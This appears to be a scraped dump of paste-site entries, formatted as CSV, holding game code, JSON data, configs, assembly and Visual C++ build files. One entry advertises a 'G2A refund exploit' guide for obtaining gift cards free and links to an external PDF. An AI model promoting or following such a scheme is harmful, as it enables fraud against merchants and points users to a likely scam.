@@ -1,0 +1,2774 @@
+id,title,username,language,date,content
+HaMrK9Ej,data796,TestGuy1,JSON,Thursday 28th of December 2023 06:00:07 AM CDT,"{
+  status: 'Success',
+  method: 'server',
+  maindata: 'd70c20797e49e170794684208c395f4a42aa301efb6246ff2d94fcd0b2e51403ba41a4fa8444ef985bb6498c0e85a8a9392b18db13cee2d05bbfe56eb37db036bf8f36560882a70a8a69119ce2e3f882fc19d9b1fb726db3424d29bfaca84f1aa1d4c9149c28b7394d58f4369f2b876e3245e3e1bea53f0d7526794e6aa9c191',
+  otherdata: [
+    '18cc6bacf846458ae0f8f10cba2c9cc8',
+    '423e9efb58ba88499e99a4ac596e3436',
+    '9c48d2508bc034e182794b4d18558a7d',
+    '54f8d4a9b2f61dea95d2d991182023ae',
+    'c9ea229c16e4cc77cebd14ad39523eea',
+    '8becbc5788a1936f7964ab2428b62b94',
+    'd4b24414b47a17c46c19be4faee7410a',
+    '51d5a0dd474b7b96b4e1f92be7616d5c'
+  ]
+}"
+KaDPFWnp,Chapter 1 Complete,sriyanto,Python,Thursday 28th of December 2023 05:58:22 AM CDT,"import tkinter as tk
+
+
+class GameObject(object):
+    def __init__(self, canvas, item):
+        self.canvas = canvas
+        self.item = item
+
+    def get_position(self):
+        return self.canvas.coords(self.item)
+
+    def move(self, x, y):
+        self.canvas.move(self.item, x, y)
+
+    def delete(self):
+        self.canvas.delete(self.item)
+
+
+class Ball(GameObject):
+    def __init__(self, canvas, x, y):
+        self.radius = 10
+        self.direction = [1, -1]
+        self.speed = 10
+        item = canvas.create_oval(x-self.radius, y-self.radius,
+                                  x+self.radius, y+self.radius,
+                                  fill='white')
+        super(Ball, self).__init__(canvas, item)
+
+    def update(self):
+        coords = self.get_position()
+        width = self.canvas.winfo_width()
+        if coords[0] <= 0 or coords[2] >= width:
+            self.direction[0] *= -1
+        if coords[1] <= 0:
+            self.direction[1] *= -1
+        x = self.direction[0] * self.speed
+        y = self.direction[1] * self.speed
+        self.move(x, y)
+
+    def collide(self, game_objects):
+        coords = self.get_position()
+        x = (coords[0] + coords[2]) * 0.5
+        if len(game_objects) > 1:
+            self.direction[1] *= -1
+        elif len(game_objects) == 1:
+            game_object = game_objects[0]
+            coords = game_object.get_position()
+            if x > coords[2]:
+                self.direction[0] = 1
+            elif x < coords[0]:
+                self.direction[0] = -1
+            else:
+                self.direction[1] *= -1
+
+        for game_object in game_objects:
+            if isinstance(game_object, Brick):
+                game_object.hit()
+
+
+class Paddle(GameObject):
+    def __init__(self, canvas, x, y):
+        self.width = 80
+        self.height = 10
+        self.ball = None
+        item = canvas.create_rectangle(x - self.width / 2,
+                                       y - self.height / 2,
+                                       x + self.width / 2,
+                                       y + self.height / 2,
+                                       fill='blue')
+        super(Paddle, self).__init__(canvas, item)
+
+    def set_ball(self, ball):
+        self.ball = ball
+
+    def move(self, offset):
+        coords = self.get_position()
+        width = self.canvas.winfo_width()
+        if coords[0] + offset >= 0 and coords[2] + offset <= width:
+            super(Paddle, self).move(offset, 0)
+            if self.ball is not None:
+                self.ball.move(offset, 0)
+
+
+class Brick(GameObject):
+    COLORS = {1: '#999999', 2: '#555555', 3: '#222222'}
+
+    def __init__(self, canvas, x, y, hits):
+        self.width = 75
+        self.height = 20
+        self.hits = hits
+        color = Brick.COLORS[hits]
+        item = canvas.create_rectangle(x - self.width / 2,
+                                       y - self.height / 2,
+                                       x + self.width / 2,
+                                       y + self.height / 2,
+                                       fill=color, tags='brick')
+        super(Brick, self).__init__(canvas, item)
+
+    def hit(self):
+        self.hits -= 1
+        if self.hits == 0:
+            self.delete()
+        else:
+            self.canvas.itemconfig(self.item,
+                                   fill=Brick.COLORS[self.hits])
+
+
+class Game(tk.Frame):
+    def __init__(self, master):
+        super(Game, self).__init__(master)
+        self.lives = 3
+        self.width = 610
+        self.height = 400
+        self.canvas = tk.Canvas(self, bg='#aaaaff',
+                                width=self.width,
+                                height=self.height,)
+        self.canvas.pack()
+        self.pack()
+
+        self.items = {}
+        self.ball = None
+        self.paddle = Paddle(self.canvas, self.width/2, 326)
+        self.items[self.paddle.item] = self.paddle
+        for x in range(5, self.width - 5, 75):
+            self.add_brick(x + 37.5, 50, 2)
+            self.add_brick(x + 37.5, 70, 1)
+            self.add_brick(x + 37.5, 90, 1)
+
+        self.hud = None
+        self.setup_game()
+        self.canvas.focus_set()
+        self.canvas.bind('<Left>',
+                         lambda _: self.paddle.move(-10))
+        self.canvas.bind('<Right>',
+                         lambda _: self.paddle.move(10))
+
+    def setup_game(self):
+           self.add_ball()
+           self.update_lives_text()
+           self.text = self.draw_text(300, 200,
+                                      'Press Space to start')
+           self.canvas.bind('<space>', lambda _: self.start_game())
+
+    def add_ball(self):
+        if self.ball is not None:
+            self.ball.delete()
+        paddle_coords = self.paddle.get_position()
+        x = (paddle_coords[0] + paddle_coords[2]) * 0.5
+        self.ball = Ball(self.canvas, x, 310)
+        self.paddle.set_ball(self.ball)
+
+    def add_brick(self, x, y, hits):
+        brick = Brick(self.canvas, x, y, hits)
+        self.items[brick.item] = brick
+
+    def draw_text(self, x, y, text, size='40'):
+        font = ('Helvetica', size)
+        return self.canvas.create_text(x, y, text=text,
+                                       font=font)
+
+    def update_lives_text(self):
+        text = 'Lives: %s' % self.lives
+        if self.hud is None:
+            self.hud = self.draw_text(50, 20, text, 15)
+        else:
+            self.canvas.itemconfig(self.hud, text=text)
+
+    def start_game(self):
+        self.canvas.unbind('<space>')
+        self.canvas.delete(self.text)
+        self.paddle.ball = None
+        self.game_loop()
+
+    def game_loop(self):
+        self.check_collisions()
+        num_bricks = len(self.canvas.find_withtag('brick'))
+        if num_bricks == 0: 
+            self.ball.speed = None
+            self.draw_text(300, 200, 'You win!')
+        elif self.ball.get_position()[3] >= self.height: 
+            self.ball.speed = None
+            self.lives -= 1
+            if self.lives < 0:
+                self.draw_text(300, 200, 'Game Over')
+            else:
+                self.after(1000, self.setup_game)
+        else:
+            self.ball.update()
+            self.after(50, self.game_loop)
+
+    def check_collisions(self):
+        ball_coords = self.ball.get_position()
+        items = self.canvas.find_overlapping(*ball_coords)
+        objects = [self.items[x] for x in items if x in self.items]
+        self.ball.collide(objects)
+
+
+
+if __name__ == '__main__':
+    root = tk.Tk()
+    root.title('Hello, Pong!')
+    game = Game(root)
+    game.mainloop()
+    
+  "
+dbnVN0p4,pisec,kirkarr,JSON,Thursday 28th of December 2023 05:55:38 AM CDT,"[{""connections"":[2.0,18.0],""pos"":""[195.3512 1193.9545 -11143.9688]""},{""connections"":[1.0,3.0],""pos"":""[233.1759 503.9871 -11143.9688]""},{""connections"":[2.0,4.0],""pos"":""[-72.3281 51.658 -11143.9688]""},{""connections"":[5.0,15.0,3.0],""pos"":""[-41.9092 -533.0078 -11143.9688]""},{""connections"":[6.0,4.0],""pos"":""[1182.0063 -610.1345 -11143.9688]""},{""connections"":[5.0,7.0],""pos"":""[1195.9259 -1203.7214 -11143.9688]""},{""connections"":[6.0,8.0],""pos"":""[1553.9883 -1702.5768 -11143.9688]""},{""connections"":[7.0,9.0,10.0],""pos"":""[1566.4437 -2233.6814 -11143.9688]""},{""connections"":[8.0,24.0,71.0],""pos"":""[3341.4629 -2192.0518 -11143.9688]""},{""connections"":[8.0,11.0],""pos"":""[1535.1226 -2818.1436 -11143.9688]""},{""connections"":[10.0,12.0],""pos"":""[1258.7432 -3274.8511 -11143.9688]""},{""connections"":[11.0,13.0],""pos"":""[1209.6064 -3709.5825 -11143.9688]""},{""connections"":[14.0,12.0,19.0,22.0],""pos"":""[-1336.3193 -3701.4614 -11143.9688]""},{""connections"":[15.0,16.0,13.0],""pos"":""[-1324.5145 -1357.7439 -11143.9688]""},{""connections"":[4.0,14.0],""pos"":""[-1320.5796 -576.5031 -11143.9688]""},{""connections"":[14.0,17.0],""pos"":""[-2976.0493 -1338.7039 -11143.9688]""},{""connections"":[16.0,18.0],""pos"":""[-2963.4585 1161.2643 -11143.9688]""},{""connections"":[17.0,1.0,72.0],""pos"":""[-1343.9893 1160.1898 -11143.9688]""},{""connections"":[13.0,20.0],""pos"":""[-3105.353 -3729.314 -11143.9688]""},{""connections"":[19.0,21.0,37.0],""pos"":""[-4238.4521 -3825.377 -11143.9688]""},{""connections"":[20.0,49.0],""pos"":""[-5928.4912 -3777.6826 -11143.9688]""},{""connections"":[13.0,23.0,37.0],""pos"":""[-1440.5188 -5937.7734 -11143.9688]""},{""connections"":[22.0,24.0,35.0],""pos"":""[567.2654 -5979.5591 -11143.9688]""},{""connections"":[23.0,25.0,27.0,9.0],""pos"":""[3327.9138 -5984.5884 -11143.9688]""},{""connections"":[24.0,26.0,68.0],""pos"":""[6181.6567 -5941.5259 -11143.9688]""},{""connections"":[25.0,27.0,31.0],""pos"":""[6195.5659 -9036.2666 -11143.9688]""},{""connections"":[26.0,24.0,28.0],""pos"":""[3441.3738 -9050.6719 -11143.9688]""},{""connections"":[27.0,30.0,36.0],""pos"":""[3322.5068 -10858.8848 -11143.9688]""},{""connections"":[34.0,30.0],""pos"":""[11006.8125 -10858.8027 -11143.9688]""},{""connections"":[28.0,31.0,29.0],""pos"":""[8834.5215 -10870.9453 -11143.9688]""},{""connections"":[30.0,26.0,32.0],""pos"":""[8836.8643 -9080.7002 -11143.9688]""},{""connections"":[31.0,33.0],""pos"":""[9274.2549 -9070.6377 -11143.9688]""},{""connections"":[32.0,34.0],""pos"":""[9350.998 -6016.0288 -11143.9688]""},{""connections"":[33.0,29.0],""pos"":""[10977.4375 -6041.377 -11143.9688]""},{""connections"":[36.0,23.0,47.0],""pos"":""[511.2954 -8608.9053 -11143.9688]""},{""connections"":[28.0,35.0],""pos"":""[583.1246 -10804.6309 -11143.9688]""},{""connections"":[20.0,38.0,22.0,44.0],""pos"":""[-4076.5034 -5962.9136 -11143.9688]""},{""connections"":[39.0,37.0],""pos"":""[-6210.6294 -5950.4087 -10887.9688]""},{""connections"":[42.0,40.0,38.0],""pos"":""[-7785.8647 -5886.7241 -10887.9688]""},{""connections"":[39.0,41.0],""pos"":""[-7854.8042 -2974.6819 -10887.9688]""},{""connections"":[40.0],""pos"":""[-9110.2373 -2903.5552 -10887.9688]""},{""connections"":[51.0,43.0,39.0],""pos"":""[-10856.876 -5987.7402 -10887.9688]""},{""connections"":[42.0,44.0],""pos"":""[-10809.1611 -8578.8711 -11143.9688]""},{""connections"":[37.0,45.0,43.0],""pos"":""[-4150.8809 -8656.4473 -11143.9688]""},{""connections"":[46.0,44.0,52.0],""pos"":""[-4100.1484 -10822.0791 -11143.9688]""},{""connections"":[47.0,45.0],""pos"":""[-2176.5161 -10880.8564 -11143.9688]""},{""connections"":[35.0,48.0,46.0],""pos"":""[-2216.3181 -8631.208 -11143.9688]""},{""connections"":[47.0],""pos"":""[-2202.0583 -7067.5933 -11143.9688]""},{""connections"":[21.0,50.0,67.0],""pos"":""[-6051.165 -494.8659 -11143.9688]""},{""connections"":[49.0,51.0,76.0],""pos"":""[-10811.0156 -573.6154 -11143.9688]""},{""connections"":[50.0,42.0],""pos"":""[-10871.7617 -3710.0562 -10905.8916]""},{""connections"":[45.0],""pos"":""[-10689.6377 -10878.3164 -11135.9688]""},{""connections"":[54.0,57.0],""pos"":""[10996.0029 -4256.8306 -11143.9688]""},{""connections"":[55.0,53.0],""pos"":""[9263.5742 -4265.6597 -11143.9688]""},{""connections"":[56.0,54.0,68.0],""pos"":""[9193.8848 -2084.0273 -11143.9688]""},{""connections"":[58.0,55.0],""pos"":""[9238.8662 373.0821 -11143.9688]""},{""connections"":[53.0,58.0,89.0],""pos"":""[10904.2197 426.2845 -11143.9688]""},{""connections"":[59.0,56.0,57.0],""pos"":""[10050.9434 399.0255 -11143.9688]""},{""connections"":[60.0,58.0],""pos"":""[9990.6582 6157.2827 -11143.9688]""},{""connections"":[61.0,59.0,77.0],""pos"":""[5043.9165 6145.6099 -11143.9688]""},{""connections"":[62.0,60.0,90.0],""pos"":""[5066.5215 7241.9712 -11143.9688]""},{""connections"":[63.0,61.0],""pos"":""[7930.1201 7302.0713 -11143.9688]""},{""connections"":[64.0,62.0],""pos"":""[9984.1846 7296.458 -10671.9688]""},{""connections"":[65.0,63.0],""pos"":""[12188.6104 7190.7378 -10671.9688]""},{""connections"":[66.0,64.0],""pos"":""[12217.4834 3710.3101 -10671.9688]""},{""connections"":[67.0,65.0],""pos"":""[-5841.3887 3506.5471 -10671.9688]""},{""connections"":[49.0,66.0],""pos"":""[-6005.1436 2310.7812 -10671.9688]""},{""connections"":[55.0,25.0,69.0],""pos"":""[6250.6455 -2098.8911 -11143.9688]""},{""connections"":[68.0,70.0],""pos"":""[6085.9238 3099.083 -11143.9688]""},{""connections"":[69.0,71.0],""pos"":""[3505.999 2998.2251 -11143.9688]""},{""connections"":[70.0,9.0,97.0],""pos"":""[3409.801 977.9648 -11143.9688]""},{""connections"":[18.0,73.0],""pos"":""[-1426.9886 1787.4382 -11143.9688]""},{""connections"":[74.0,72.0],""pos"":""[-1723.4307 2232.1482 -11143.9688]""},{""connections"":[73.0,75.0],""pos"":""[-1767.6841 2852.3557 -11143.9688]""},{""connections"":[76.0,74.0,85.0],""pos"":""[-4769.6201 2863.4348 -11143.9688]""},{""connections"":[75.0,50.0],""pos"":""[-10875.3281 2844.0334 -11143.9688]""},{""connections"":[78.0,60.0,97.0],""pos"":""[1547.0912 6127.5137 -11143.9688]""},{""connections"":[79.0,77.0,85.0],""pos"":""[-1543.7648 6153.4766 -11143.9688]""},{""connections"":[80.0,78.0],""pos"":""[-1601.1115 8686.0547 -11143.9688]""},{""connections"":[81.0,79.0],""pos"":""[-1621.3654 12342.917 -11143.9688]""},{""connections"":[82.0,80.0],""pos"":""[-8699.8643 12452.7324 -11143.9688]""},{""connections"":[83.0,81.0],""pos"":""[-8719.8242 10198.8389 -10887.9688]""},{""connections"":[84.0,82.0],""pos"":""[-8762.9277 6154.7158 -10887.9688]""},{""connections"":[85.0,83.0,86.0],""pos"":""[-7658.8301 6096.9448 -10887.9688]""},{""connections"":[75.0,84.0,78.0],""pos"":""[-4827.3984 6072.7896 -10887.9688]""},{""connections"":[87.0,84.0],""pos"":""[-7541.3555 4259.0972 -11143.9688]""},{""connections"":[86.0,88.0],""pos"":""[-11310.0527 4251.8843 -11143.9688]""},{""connections"":[87.0],""pos"":""[-11308.1562 6685.27 -11143.9688]""},{""connections"":[57.0],""pos"":""[11892.5674 456.0444 -11143.9688]""},{""connections"":[91.0,61.0],""pos"":""[5049.9922 13051.7402 -11143.9688]""},{""connections"":[92.0,90.0],""pos"":""[8703.7168 12983.9863 -10895.9922]""},{""connections"":[93.0,91.0,94.0],""pos"":""[9236.2256 12954.7871 -10895.9688]""},{""connections"":[92.0],""pos"":""[9243.667 10325.6953 -10895.9688]""},{""connections"":[92.0,95.0],""pos"":""[11274.0762 13000.4229 -11135.9688]""},{""connections"":[96.0,94.0],""pos"":""[12909.1299 12960.042 -11135.9688]""},{""connections"":[95.0],""pos"":""[12878.4922 7913.9688 -11135.9688]""},{""connections"":[71.0,77.0],""pos"":""[1587.9412 953.0262 -11143.9688]""}]"
+vNLbJu0i,Markdown med betingelser,marlar,YAML,Thursday 28th of December 2023 05:53:34 AM CDT,"type: markdown
+content: >-
+  {%- macro out_of_range(value, min_value, max_value) %}
+      {{- """" if min_value|float <= value|float <= max_value|float else true }}
+  {%- endmacro %}
+
+
+  {%- set invalid =
+  out_of_range(states(""sensor.aqara_koleskab_temperature""),4,6) %}
+
+  <font{{ "" color=red"" if invalid }}><ha-icon
+  icon=""mdi:fridge""></ha-icon></font> Køleskab {{
+  states(""sensor.aqara_koleskab_temperature"") }}°C {{ "" <font
+  color='red'>er uden for intervallet</font>"" if invalid}}
+title: Køleskab
+"
+maigxMbe,chapter1_02,sriyanto,Python,Thursday 28th of December 2023 05:52:43 AM CDT,"import tkinter as tk
+
+
+class GameObject(object):
+    def __init__(self, canvas, item):
+        self.canvas = canvas
+        self.item = item
+
+    def get_position(self):
+        return self.canvas.coords(self.item)
+
+    def move(self, x, y):
+        self.canvas.move(self.item, x, y)
+
+    def delete(self):
+        self.canvas.delete(self.item)
+
+
+class Ball(GameObject):
+    def __init__(self, canvas, x, y):
+        self.radius = 10
+        self.direction = [1, -1]
+        self.speed = 10
+        item = canvas.create_oval(x-self.radius, y-self.radius,
+                                  x+self.radius, y+self.radius,
+                                  fill='white')
+        super(Ball, self).__init__(canvas, item)
+
+
+class Paddle(GameObject):
+    def __init__(self, canvas, x, y):
+        self.width = 80
+        self.height = 10
+        self.ball = None
+        item = canvas.create_rectangle(x - self.width / 2,
+                                       y - self.height / 2,
+                                       x + self.width / 2,
+                                       y + self.height / 2,
+                                       fill='blue')
+        super(Paddle, self).__init__(canvas, item)
+
+    def set_ball(self, ball):
+        self.ball = ball
+
+    def move(self, offset):
+        coords = self.get_position()
+        width = self.canvas.winfo_width()
+        if coords[0] + offset >= 0 and coords[2] + offset <= width:
+            super(Paddle, self).move(offset, 0)
+            if self.ball is not None:
+                self.ball.move(offset, 0)
+
+
+class Brick(GameObject):
+    COLORS = {1: '#999999', 2: '#555555', 3: '#222222'}
+
+    def __init__(self, canvas, x, y, hits):
+        self.width = 75
+        self.height = 20
+        self.hits = hits
+        color = Brick.COLORS[hits]
+        item = canvas.create_rectangle(x - self.width / 2,
+                                       y - self.height / 2,
+                                       x + self.width / 2,
+                                       y + self.height / 2,
+                                       fill=color, tags='brick')
+        super(Brick, self).__init__(canvas, item)
+
+    def hit(self):
+        self.hits -= 1
+        if self.hits == 0:
+            self.delete()
+        else:
+            self.canvas.itemconfig(self.item,
+                                   fill=Brick.COLORS[self.hits])
+
+
+class Game(tk.Frame):
+    def __init__(self, master):
+        super(Game, self).__init__(master)
+        self.lives = 3
+        self.width = 610
+        self.height = 400
+        self.canvas = tk.Canvas(self, bg='#aaaaff',
+                                width=self.width,
+                                height=self.height,)
+        self.canvas.pack()
+        self.pack()
+
+        self.items = {}
+        self.ball = None
+        self.paddle = Paddle(self.canvas, self.width/2, 326)
+        self.items[self.paddle.item] = self.paddle
+        for x in range(5, self.width - 5, 75):
+            self.add_brick(x + 37.5, 50, 2)
+            self.add_brick(x + 37.5, 70, 1)
+            self.add_brick(x + 37.5, 90, 1)
+
+        self.hud = None
+        self.setup_game()
+        self.canvas.focus_set()
+        self.canvas.bind('<Left>',
+                         lambda _: self.paddle.move(-10))
+        self.canvas.bind('<Right>',
+                         lambda _: self.paddle.move(10))
+
+    def setup_game(self):
+           self.add_ball()
+           self.update_lives_text()
+           self.text = self.draw_text(300, 200,
+                                      'Press Space to start')
+           self.canvas.bind('<space>', lambda _: self.start_game())
+
+    def add_ball(self):
+        if self.ball is not None:
+            self.ball.delete()
+        paddle_coords = self.paddle.get_position()
+        x = (paddle_coords[0] + paddle_coords[2]) * 0.5
+        self.ball = Ball(self.canvas, x, 310)
+        self.paddle.set_ball(self.ball)
+
+    def add_brick(self, x, y, hits):
+        brick = Brick(self.canvas, x, y, hits)
+        self.items[brick.item] = brick
+
+    def draw_text(self, x, y, text, size='40'):
+        font = ('Helvetica', size)
+        return self.canvas.create_text(x, y, text=text, font=font)
+
+    def update_lives_text(self):
+        text = 'Lives: %s' % self.lives
+        if self.hud is None:
+            self.hud = self.draw_text(50, 20, text, 15)
+        else:
+            self.canvas.itemconfig(self.hud, text=text)
+
+    def start_game(self):
+        pass
+
+
+if __name__ == '__main__':
+    root = tk.Tk()
+    root.title('Hello, Pong!')
+    game = Game(root)
+    game.mainloop()
+"
+rWhAj0AY,Untitled,dreadmachine,MPASM,Thursday 28th of December 2023 05:52:22 AM CDT,"list p=16F84A
+#include <p16F84a.inc>
+__CONFIG _CP_OFF & _WDT_OFF & _PWRTE_ON & _XT_OSC
+
+tmp EQU 0x0F
+
+ORG 0x000 ; processor reset vector
+bcf STATUS,RP1
+bsf STATUS,RP0 ; switch to register bank 1
+movlw 0x1C ; control word for port A
+movwf TRISA ; RA4, RA3, RA2 - input, RA1, RA0 - output
+movlw 0xFF ; control word for port B
+movwf TRISB ; all are inputs for now
+bcf STATUS,RP0 ; switch back to register bank 0
+
+start
+movf PORTA, w ; load data from port A into w
+andlw 0x1C ; apply mask 00011100 - isolate A B C
+movwf tmp ; save 000ABC00 in tmp
+andlw 0x04 ; apply mask 00000100 - isolate C
+xorlw 0x04 ; negate C in accumulator
+btfsc STATUS,Z ; if !C=1 then
+bsf tmp, 0x02 ; set 000ABC10 in tmp
+movf tmp, w ; load 000ABC10 into accumulator
+andlw 0x10 ; apply mask 00010000 - isolate A
+rrf w ; rotate w to the right, so it lines up with B in tmp
+xorwf tmp, w ; A xor B
+andlw 0x08 ; isolate (A xor B) value
+rrf w ; (A xor B) is now at 0x04
+rrf w ; (A xor B) is now at 0x02, lines up with !C in tmp
+iorwf tmp, w ; (A xor B) || !C
+andlw 0x02 ; isolate result
+movwf PORTA ; output result on port A
+goto start
+
+end
+
+"
+0ZnfZLns,a59.plg,FlyFar,C++,Thursday 28th of December 2023 05:51:52 AM CDT,"<html>
+<body>
+<pre>
+<h1>Build Log</h1>
+<h3>
+--------------------Configuration: a59 - Win32 Release--------------------
+</h3>
+<h3>Command Lines</h3>
+Creating temporary file ""C:\Users\Pro\AppData\Local\Temp\RSP182E.tmp"" with contents
+[
+/nologo /MD /W3 /GX /O2 /D ""WIN32"" /D ""_WINDOWS"" /D ""_MBCS"" /Fp""Release/a59.pch"" /YX /Fo""Release/"" /Fd""Release/"" /FD /c 
+""C:\Users\Pro\Desktop\a59base\bot source\a59.cpp""
+]
+Creating command line ""cl.exe @C:\Users\Pro\AppData\Local\Temp\RSP182E.tmp"" 
+Creating temporary file ""C:\Users\Pro\AppData\Local\Temp\RSP182F.tmp"" with contents
+[
+kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib /nologo /subsystem:console /incremental:no /pdb:""Release/a59.pdb"" /machine:I386 /out:""Release/a59.exe"" 
+"".\Release\a59.obj""
+]
+Creating command line ""link.exe @C:\Users\Pro\AppData\Local\Temp\RSP182F.tmp""
+<h3>Output Window</h3>
+Compiling...
+a59.cpp
+Linking...
+MSVCRT.lib(crtexe.obj) : error LNK2001: unresolved external symbol _main
+Release/a59.exe : fatal error LNK1120: 1 unresolved externals
+Error executing link.exe.
+
+
+
+<h3>Results</h3>
+a59.exe - 2 error(s), 0 warning(s)
+</pre>
+</body>
+</html>"
+tYaADcTx,a59.dsw,FlyFar,C++,Thursday 28th of December 2023 05:50:29 AM CDT,"Microsoft Developer Studio Workspace File, Format Version 6.00
+# WARNING: DO NOT EDIT OR DELETE THIS WORKSPACE FILE!
+
+###############################################################################
+
+Project: ""a59""="".\a59.dsp"" - Package Owner=<4>
+
+Package=<5>
+{{{
+}}}
+
+Package=<4>
+{{{
+}}}
+
+###############################################################################
+
+Global:
+
+Package=<5>
+{{{
+}}}
+
+Package=<3>
+{{{
+}}}
+
+###############################################################################
+"
+gTCarpw5,cyber alliance css draft 14,Anonx0,CSS,Thursday 28th of December 2023 05:48:50 AM CDT,":root {
+  --blood: #ef5956;
+  --crimson: #d33131;
+  --light: #ffffff;
+}
+
+html {
+  font: 16px/1 system-ui;
+  height: 100%;
+}
+
+body {
+  margin: 0;
+  padding: 5rem;
+}
+
+header {}
+
+h1 {
+  color: var(--crimson);
+  font-size: 5rem;
+  font-weight: 1000;
+  margin: 0 0 2rem;
+}
+
+abbr {
+  display: inline-block;
+  text-decoration: none;
+}
+
+p {
+  line-height: 1.5;
+  margin: 0 0 1rem;
+}
+
+span {
+  display: inline-block;
+}
+
+time {
+  display: inline-block;
+}
+
+hr {
+  background: var(--crimson);
+  border: 0;
+  height: .2rem;
+  margin: 0 0 1rem;
+}
+
+main {}
+
+footer {}
+
+@media (min-width: 1000px) {
+  html {
+    background: var(--blood);
+    display: grid;
+    justify-content: center;
+  }
+
+  body {
+    background: var(--light);
+    border-left: .2rem solid var(--crimson);
+    border-right: .2rem solid var(--crimson);
+    box-sizing: border-box;
+    width: 1000px;
+  }
+
+  header {}
+
+  h1 {}
+
+  abbr {}
+
+  p {}
+
+  span {}
+
+  time {}
+
+  hr {}
+
+  main {}
+
+  footer {}
+}"
+XLMVBw0H,chapter1_01,sriyanto,Python,Thursday 28th of December 2023 05:45:52 AM CDT,"import tkinter as tk
+
+class Game(tk.Frame):
+    def __init__(self, master):
+        super(Game, self).__init__(master)
+        self.lives = 3
+        self.width = 610
+        self.height = 400
+        self.canvas = tk.Canvas(self, bg='#aaaaff',
+                                width=self.width,
+                                height=self.height,)
+        self.canvas.pack()
+        self.pack()
+
+
+if __name__ == '__main__':
+    root = tk.Tk()
+    root.title('Hello, Pong!')
+    game = Game(root)
+    game.mainloop()"
+jtT9Lq2h,G2A.com Refund Exploit Dec 2023,G2ARefundExploit,GetText,Thursday 28th of December 2023 05:44:43 AM CDT,"G2A.com refund exploit updated guide 
+Any item for free on G2A.com such as Amazon, Steam, and any other gift cards.
+
+PDF guide here:
+https://drive.google.com/file/d/120kXNJWM5T5u3PGlkQeZCo_nLxzQIlkf/view?usp=g2a_refund_exploit.pdf
+
+Working as of 
+28 December 2023
+
+667021"
+Tkic3Ges,wofi,bluebyt,INI file,Thursday 28th of December 2023 05:44:39 AM CDT,"#width =25%
+#height=20%
+
+width=600
+height=500
+show=drun
+prompt=Search...
+filter_rate=100
+allow_markup=true
+no_actions=true
+halign=fill
+orientation=vertical
+content_halign=fill
+insensitive=true
+allow_images=true
+image_size=40
+gtk_dark=true"
+00aLqmKr,a59.dsp,FlyFar,C++,Thursday 28th of December 2023 05:40:50 AM CDT,"# Microsoft Developer Studio Project File - Name=""a59"" - Package Owner=<4>
+# Microsoft Developer Studio Generated Build File, Format Version 6.00
+# ** DO NOT EDIT **
+
+# TARGTYPE ""Win32 (x86) Console Application"" 0x0103
+
+CFG=a59 - Win32 Debug
+!MESSAGE This is not a valid makefile. To build this project using NMAKE,
+!MESSAGE use the Export Makefile command and run
+!MESSAGE 
+!MESSAGE NMAKE /f ""a59.mak"".
+!MESSAGE 
+!MESSAGE You can specify a configuration when running NMAKE
+!MESSAGE by defining the macro CFG on the command line. For example:
+!MESSAGE 
+!MESSAGE NMAKE /f ""a59.mak"" CFG=""a59 - Win32 Debug""
+!MESSAGE 
+!MESSAGE Possible choices for configuration are:
+!MESSAGE 
+!MESSAGE ""a59 - Win32 Release"" (based on ""Win32 (x86) Console Application"")
+!MESSAGE ""a59 - Win32 Debug"" (based on ""Win32 (x86) Console Application"")
+!MESSAGE 
+
+# Begin Project
+# PROP AllowPerConfigDependencies 0
+# PROP Scc_ProjName """"
+# PROP Scc_LocalPath """"
+CPP=cl.exe
+RSC=rc.exe
+
+!IF  ""$(CFG)"" == ""a59 - Win32 Release""
+
+# PROP BASE Use_MFC 0
+# PROP BASE Use_Debug_Libraries 0
+# PROP BASE Output_Dir ""Release""
+# PROP BASE Intermediate_Dir ""Release""
+# PROP BASE Target_Dir """"
+# PROP Use_MFC 0
+# PROP Use_Debug_Libraries 0
+# PROP Output_Dir ""Release""
+# PROP Intermediate_Dir ""Release""
+# PROP Ignore_Export_Lib 0
+# PROP Target_Dir """"
+# ADD BASE CPP /nologo /W3 /GX /O2 /D ""WIN32"" /D ""NDEBUG"" /D ""_CONSOLE"" /D ""_MBCS"" /YX /FD /c
+# ADD CPP /nologo /MD /W3 /GX /O2 /D ""WIN32"" /D ""_WINDOWS"" /D ""_MBCS"" /YX /FD /c
+# ADD BASE RSC /l 0x409 /d ""NDEBUG""
+# ADD RSC /l 0x409 /d ""NDEBUG""
+BSC32=bscmake.exe
+# ADD BASE BSC32 /nologo
+# ADD BSC32 /nologo
+LINK32=link.exe
+# ADD BASE LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib /nologo /subsystem:console /machine:I386
+# ADD LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib /nologo /subsystem:console /machine:I386
+
+!ELSEIF  ""$(CFG)"" == ""a59 - Win32 Debug""
+
+# PROP BASE Use_MFC 0
+# PROP BASE Use_Debug_Libraries 1
+# PROP BASE Output_Dir ""Debug""
+# PROP BASE Intermediate_Dir ""Debug""
+# PROP BASE Target_Dir """"
+# PROP Use_MFC 0
+# PROP Use_Debug_Libraries 1
+# PROP Output_Dir ""Debug""
+# PROP Intermediate_Dir ""Debug""
+# PROP Target_Dir """"
+# ADD BASE CPP /nologo /W3 /Gm /GX /ZI /Od /D ""WIN32"" /D ""_DEBUG"" /D ""_CONSOLE"" /D ""_MBCS"" /YX /FD /GZ /c
+# ADD CPP /nologo /W3 /Gm /GX /ZI /Od /D ""WIN32"" /D ""_DEBUG"" /D ""_CONSOLE"" /D ""_MBCS"" /YX /FD /GZ /c
+# ADD BASE RSC /l 0x409 /d ""_DEBUG""
+# ADD RSC /l 0x409 /d ""_DEBUG""
+BSC32=bscmake.exe
+# ADD BASE BSC32 /nologo
+# ADD BSC32 /nologo
+LINK32=link.exe
+# ADD BASE LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib /nologo /subsystem:console /debug /machine:I386 /pdbtype:sept
+# ADD LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib /nologo /subsystem:console /debug /machine:I386 /pdbtype:sept
+
+!ENDIF 
+
